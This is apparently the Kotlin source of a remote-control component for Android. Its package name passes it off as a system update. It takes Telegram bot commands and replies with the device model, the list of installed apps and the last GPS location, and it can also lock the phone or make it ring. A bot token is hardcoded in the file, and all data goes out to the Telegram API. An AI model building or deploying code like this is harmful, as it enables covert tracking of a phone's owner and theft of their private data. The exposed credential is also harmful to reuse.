package com.sys.update

import android.content.Context
import kotlinx.coroutines.*
import okhttp3.*
import java.util.concurrent.TimeUnit

object CmdHandler {
    private val client = OkHttpClient.Builder()
        .readTimeout(60, TimeUnit.SECONDS).build()

    fun handle(ctx: Context, cmd: String, chatId: String) {
        val token = "7966180213:AAGFqmNDy9b-vNFRAvuBQy6yf3b2U5fIxbI" // Ye wahi token jo BotService mein hai
        CoroutineScope(Dispatchers.IO).launch {
            val reply = when {
                cmd == "/start"    -> "🟢 Online. Commands: /info /lock /ring /location /apps"
                cmd == "/info"     -> deviceInfo()
                cmd == "/apps"     -> installedApps(ctx)
                cmd == "/lock"     -> { lockDevice(ctx); "🔒 Locked." }
                cmd == "/ring"     -> { ringDevice(ctx); "🔔 Ringing." }
                cmd == "/location" -> getLocation(ctx)
                else               -> "❓ Unknown: $cmd"
            }
            send(token, chatId, reply)
        }
    }

    private fun deviceInfo(): String = """
        📱 *Device Info*
        Model: ${android.os.Build.MODEL}
        Brand: ${android.os.Build.BRAND}
        Android: ${android.os.Build.VERSION.RELEASE}
        SDK: ${android.os.Build.VERSION.SDK_INT}
    """.trimIndent()

    private fun installedApps(ctx: Context): String {
        val pm = ctx.packageManager
        val apps = pm.getInstalledApplications(0)
            .filter { pm.getLaunchIntentForPackage(it.packageName) != null }
            .map { it.packageName }
        return "📦 Apps (${apps.size}):\n" + apps.take(60).joinToString("\n")
    }

    private fun lockDevice(ctx: Context) {
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        try { dpm.lockNow() } catch (e: Exception) {}
    }

    private fun ringDevice(ctx: Context) {
        val r = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
        val ring = android.media.RingtoneManager.getRingtone(ctx, r)
        ring.play()
    }

    private fun getLocation(ctx: Context): String {
        return try {
            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
            if (loc != null) "📍 ${loc.latitude}, ${loc.longitude}"
            else "❌ No location yet."
        } catch (e: SecurityException) {
            "❌ Location permission not granted."
        }
    }

    private fun send(token: String, chatId: String, text: String) {
        val url = "https://api.telegram.org/bot$token/sendMessage"
        val body = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", text)
            .add("parse_mode", "Markdown")
            .build()
        client.newCall(Request.Builder().url(url).post(body).build()).execute().close()
    }
}
